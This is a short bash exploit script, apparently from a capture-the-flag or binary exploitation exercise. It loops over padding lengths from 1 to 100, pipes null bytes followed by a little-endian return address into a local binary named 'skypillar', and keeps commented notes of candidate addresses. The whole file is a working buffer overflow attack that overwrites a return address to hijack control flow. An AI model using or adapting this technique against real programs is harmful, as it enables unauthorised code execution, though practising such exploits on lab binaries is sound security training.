#!/bin/bash
for i in {1..100}
do
	echo "Trying $i"	
	python -c "print('\x00'*$i+'\x1e\x90\x04\x08')" | ~/Desktop/skypillar
	#echo "Welcome $i times"
done

#0x8048741
# \x41\x87\x04\x08

# // 0x804901e
# \x1e\x90\x04\x08
